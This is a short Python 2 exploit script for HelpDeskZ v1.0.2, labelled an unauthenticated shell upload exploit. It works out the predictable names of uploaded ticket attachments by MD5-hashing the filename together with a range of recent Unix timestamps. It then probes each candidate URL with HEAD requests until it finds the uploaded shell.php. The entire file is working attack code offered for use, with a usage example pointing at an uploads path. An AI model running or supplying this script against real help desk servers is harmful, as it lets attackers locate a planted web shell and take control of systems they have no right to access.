# added some improvements
# python hack2.py http://localhost/support/uploads/tickets/ shell.php

import hashlib
import os
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
 
if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)
 
helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]
 
currentTime = int(time.time()) + 50
 
for x in range(0, 350):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()
 
    basename, ext = os.path.splitext(fileName)

    url = helpdeskzBaseUrl+md5hash+ext

    print "Looking at {}".format(url)

    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)
    else:
        print "Did not find on attempt {}\n".format(x)
 
print "Sorry, I did not find anything"
